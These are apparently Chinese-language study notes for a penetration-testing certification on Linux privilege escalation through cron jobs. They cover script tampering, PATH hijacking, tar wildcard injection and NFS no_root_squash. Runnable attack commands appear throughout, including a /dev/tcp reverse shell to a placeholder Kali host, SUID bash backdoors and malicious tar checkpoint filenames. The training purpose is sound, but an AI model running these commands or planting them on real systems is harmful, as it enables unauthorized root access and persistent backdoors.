# 第 92 章 - Cron 與可寫路徑

## 標籤

- #cpts
- #chapter
- #linux
- #cron
- #writable-paths
- #priv-esc

## 學習目標

- 找出以 root 身份執行的排程工作（cron / systemd timer）。
- 辨識腳本可寫、PATH 污染、萬用字元濫用三種利用路線。
- 能用 pspy 監控即時進程，找到不在 crontab 中的隱藏排程。
- 理解 NFS no_root_squash 的提權原理。

---

## 理論基礎

| 攻擊類型 | 條件 | 利用方式 |
|---------|------|---------|
| 可寫腳本 | root cron 執行的腳本可被我們寫入 | 修改腳本內容 → root 執行 |
| PATH 污染 | 腳本用相對路徑呼叫指令，且前段目錄可寫 | 在可寫目錄放同名惡意程式 |
| 萬用字元注入 | cron 用 tar / rsync 等搭配 * | 用檔案名作為惡意參數 |
| NFS no_root_squash | NFS 共享未設 root_squash | Kali 上以 root 寫 SUID shell |

---

## 步驟一：枚舉排程工作

```bash
# ─────── crontab 位置 ───────
cat /etc/crontab
# 系統全域 crontab，格式：
# minute hour day month weekday user command
# 重點：user 欄位是 root → 找這行執行的 command 路徑

ls -la /etc/cron.d/
# /etc/cron.d/ 目錄下的額外 crontab 設定
cat /etc/cron.d/*

ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
# 各頻率目錄下的腳本（以 root 身份執行）

# 使用者的 crontab
crontab -l
# -l → 列出當前使用者的 crontab
# 看其他使用者（需要 sudo 或讀取 /var/spool/cron/crontabs/）

cat /var/spool/cron/crontabs/* 2>/dev/null
# 所有使用者的 crontab 存放位置

# systemd timer（現代系統替代 cron）
systemctl list-timers --all
# 列出所有 timer（包含停止的）
# 找 ACTIVATES 欄位 → 對應的 service

# ─────── pspy（即時監控，不需 root）───────
./pspy64
# 監控所有程序的建立（包含 cron 執行的程序）
# 輸出格式：UID=0 ... CMD=/path/to/script
# UID=0 → root 執行
# 等待幾分鐘，看有哪些定期出現的 UID=0 程序

# 64 位元版：pspy64
# 32 位元版：pspy32
```

---

## 方法一：可寫腳本替換

```bash
# Step 1：找 cron 執行的腳本路徑
cat /etc/crontab | grep root
# 輸出範例：
# * * * * * root /opt/backup/backup.sh

# Step 2：確認腳本權限
ls -la /opt/backup/backup.sh
# -rwxrwxr-x → others 有寫入權限 → 可利用
# -rwxr-xr-x → 只有 root 可寫 → 找上層目錄

ls -la /opt/backup/
# 若目錄本身可寫 → 可以替換整個腳本

# Step 3：修改腳本（注入反向連線）
echo "bash -i >& /dev/tcp/KALI_IP/443 0>&1" >> /opt/backup/backup.sh
# >> → 追加到腳本末尾（保留原有功能，更隱蔽）
# bash -i → 互動式 bash
# >& /dev/tcp/IP/PORT → 連線到 Kali（TCP）
# 0>&1 → stdin 重定向到 stdout

# 或加 SUID bit 到 bash
echo "chmod +s /bin/bash" >> /opt/backup/backup.sh
# 等 cron 執行後：
/bin/bash -p

# Step 4：監聽（Kali）
nc -lvnp 443
# -l → 監聽模式
# -v → 詳細輸出
# -n → 不做 DNS 解析
# -p → 指定 port
```

---

## 方法二：PATH 污染

```bash
# 原理：若 cron 腳本用相對路徑呼叫指令，
# 且 PATH 中有可寫目錄排在系統目錄前面

# Step 1：查看腳本 PATH 設定
cat /etc/crontab | head -5
# 找 PATH= 行
# 範例：PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin

# Step 2：看腳本使用了哪些命令（是否用相對路徑）
cat /opt/backup/backup.sh
# 若有：cp archive.tar.gz /backup/
# cp 沒有完整路徑 → 會從 PATH 搜尋

# Step 3：在 PATH 前段的可寫目錄建立惡意程式
cat > /home/user/cp << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /home/user/cp
# 建立一個名為 cp 的惡意腳本
# 當 cron 執行 backup.sh 時，會先找到我們的 cp

# Step 4：等 cron 執行，然後
/bin/bash -p
```

---

## 方法三：萬用字元注入（Wildcard Injection）

```bash
# 原理：tar / rsync 的 * 萬用字元展開後，
# 檔案名稱可以作為參數被解析

# 情境：cron 執行
# cd /opt/logs && tar czf /backup/logs.tar.gz *
# * 展開 → 目錄中所有檔案名（包含以 - 開頭的「特殊」檔名）

# Step 1：在目標目錄建立惡意「檔名」
cd /opt/logs

# 建立惡意 checkpoint 腳本
cat > /opt/logs/shell.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /opt/logs/shell.sh

# 建立觸發參數的「檔名」
touch '/opt/logs/--checkpoint=1'
touch '/opt/logs/--checkpoint-action=exec=shell.sh'
# tar 會把這兩個「檔名」當作參數解析：
# --checkpoint=1 → 每處理 1 個 block 執行 checkpoint action
# --checkpoint-action=exec=shell.sh → 執行 shell.sh

# Step 2：等 cron 執行 tar，然後
/bin/bash -p
```

---

## 方法四：NFS no_root_squash

```bash
# 原理：NFS 共享若設定 no_root_squash，
# 客戶端的 root 使用者在 NFS 上也有 root 權限
# 可以在客戶端（Kali）建立 SUID shell 並掛載到目標

# Step 1：目標上確認 NFS 設定
cat /etc/exports
# 輸出範例：
# /shared 10.10.10.0/24(rw,sync,no_subtree_check,no_root_squash)
# no_root_squash → root 客戶端有完整 root 權限

# Step 2：從 Kali 掛載 NFS
showmount -e TARGET_IP
# showmount → 查看 NFS 共享
# -e TARGET_IP → 列出目標的 NFS exports

mkdir /tmp/nfs_mount
mount -t nfs TARGET_IP:/shared /tmp/nfs_mount
# mount -t nfs → 掛載 NFS 類型
# TARGET_IP:/shared → 遠端共享路徑
# /tmp/nfs_mount → 本地掛載點

# Step 3：以 root 身份在掛載點建立 SUID bash
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +s /tmp/nfs_mount/rootbash
# chmod +s → 設定 SUID bit（在 NFS 上以 root 身份，所以有效）

# Step 4：目標上執行
/shared/rootbash -p
# -p → 保留 SUID 的 effective UID（root）
```

---

## 速查表

```bash
# cron 枚舉
cat /etc/crontab
ls /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
cat /var/spool/cron/crontabs/* 2>/dev/null

# 即時監控（找隱藏 cron）
./pspy64

# 確認腳本可寫
ls -la /path/to/cron_script.sh

# 注入反向連線
echo "bash -i >& /dev/tcp/KALI_IP/443 0>&1" >> /path/to/script.sh

# 萬用字元注入（tar）
touch '/target/--checkpoint=1'
touch '/target/--checkpoint-action=exec=shell.sh'

# NFS 確認
cat /etc/exports | grep no_root_squash
showmount -e TARGET_IP
```

---

## 關聯筆記

- [[89-本機列舉|第 89 章 - 本機列舉]]
- [[90-Sudo|第 90 章 - Sudo]]
- [[11-Volume-11-Linux-Privilege-Escalation-Index|Vol.11 - Linux PrivEsc]]
